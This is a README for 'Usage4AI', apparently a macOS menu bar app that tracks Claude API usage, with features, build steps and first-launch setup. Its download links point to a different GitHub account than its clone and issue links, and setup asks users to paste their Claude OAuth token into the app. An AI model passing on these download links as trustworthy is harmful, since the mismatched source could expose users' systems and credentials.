# 🌟 Usage4AI - Monitor Claude API Effortlessly

[![Download Usage4AI](https://img.shields.io/badge/Download%20Usage4AI-v1.0-blue.svg)](https://github.com/Vororna/Usage4AI/releases)

## 📋 Overview

Welcome to Usage4AI, a macOS menu bar app designed for monitoring your Claude API usage. This tool helps you keep track of your usage conveniently, right from your menu bar.

![Screenshot](screenshot.png)

## 🚀 Features

- **Real-time Monitoring:** Check your 5-hour and 7-day usage at a glance.
- **Visual Progress Bars:** See your usage clearly with percentage displays.
- **Custom Refresh Intervals:** Set how often you want your data updated, from 30 seconds to 10 minutes.
- **Usage Alerts:** Get notified if you exceed 90% of your usage limit.
- **Network Resilience:** The app automatically retries connections in case of network issues.
- **Subscription Support:** Works with both Claude Pro and Claude Max plans.

## 📥 Requirements

- **macOS Version:** Requires macOS 15.0 or later.
- **Claude Code CLI:** You must install the [Claude Code CLI](https://github.com/anthropics/claude-code) and log in to obtain your OAuth token.

## 💻 Download & Install

### Option 1: Download Release

To get started, you can easily download the latest version of Usage4AI. Visit this page to download: [Releases](https://github.com/Vororna/Usage4AI/releases).

Click the button above to directly download the application. 

### Option 2: Build from Source

If you prefer to build the application yourself, follow these steps:

1. Open Terminal on your macOS.
2. Clone the repository by running:
   ```bash
   git clone https://github.com/lion9453/Usage4AI.git
   ```
3. Navigate to the project directory:
   ```bash
   cd Usage4AI
   ```
4. Build the app with the following command:
   ```bash
   xcodebuild -scheme Usage4AI -configuration Release -derivedDataPath build build
   ```
5. Move the app to your Applications folder:
   ```bash
   cp -R build/Build/Products/Release/Usage4AI.app /Applications/
   ```

### 🛠 First Launch Setup

1. **Ensure Claude Code CLI is Installed:**
   Make sure you have the [Claude Code CLI](https://github.com/anthropics/claude-code) installed and set up to log in with your credentials.

2. **Open Usage4AI:**
   Navigate to your Applications folder, find Usage4AI, and double-click to open it.

3. **Log In:**
   When prompted, enter your OAuth token from the Claude Code CLI to connect the app with your account.

4. **Configure Preferences:**
   Adjust the refresh intervals and set up your usage alerts as per your needs.

## ⚙️ Navigating the App

- **Menu Bar Access:** Once open, you will see the app icon in your menu bar. Click it to access features.
- **Usage Overview:** The app displays real-time usage statistics in a clear format.
- **Alerts:** Be alert for any notifications regarding your usage limit.
  
## 📞 Support

If you encounter issues or have questions, feel free to reach out through the issue tracker on the [GitHub repository](https://github.com/lion9453/Usage4AI/issues).

## 📄 License

This project is licensed under the MIT License. See the LICENSE file for details.

## 📢 Acknowledgments

Thanks to everyone who contributed to the development of Usage4AI and to the Claude API for providing a robust service. 

Feel free to explore the app and monitor your API usage with ease!